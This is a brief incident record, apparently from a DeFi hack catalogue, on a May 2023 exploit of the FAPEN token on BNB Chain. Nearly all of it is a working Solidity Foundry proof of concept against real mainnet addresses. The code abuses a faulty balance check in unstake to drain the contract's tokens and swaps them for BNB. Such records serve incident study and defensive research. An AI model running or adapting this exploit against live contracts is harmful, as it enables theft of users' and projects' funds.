# [?] FAPEN - Wrong balance check

## Summary
Severity: Unknown
Chain: BNB Chain
Component: FAPEN
Published: 2023-05-29
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/FAPEN_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$600

```solidity
contract ContractTest is Test {
    IFAPEN FAPEN = IFAPEN(0xf3F1aBae8BfeCA054B330C379794A7bf84988228);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_637_846);
        cheats.label(address(FAPEN), "FAPEN");
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(Router), "Router");
    }

    function testUnstake() public {
        deal(address(this), 0);
        emit log_named_decimal_uint("Amount of BNB before attack", address(this).balance, 18);
        // Vulnerability lies in unstake function. Bad logic in balance check
        FAPEN.unstake(FAPEN.balanceOf(address(FAPEN)));
        FAPEN.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(FAPEN);
        path[1] = address(WBNB);
        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            FAPEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        emit log_named_decimal_uint("Amount of BNB after attack", address(this).balance, 18);
    }

    receive() external payable {}
}
```
